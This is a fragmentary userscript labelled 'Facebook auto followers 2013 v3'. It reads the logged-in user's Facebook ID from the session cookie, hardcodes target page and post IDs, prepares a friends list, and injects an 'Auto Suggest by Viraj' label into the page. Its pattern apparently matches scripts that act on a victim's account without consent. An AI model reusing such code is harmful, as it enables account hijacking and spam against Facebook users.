...
// @description     Facebook auto followers 2013 v3
...
var spage_id = "466760940043710";
var spost_id = "466760940043710";
var sfoto_id = "466760940043710";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Viraj';
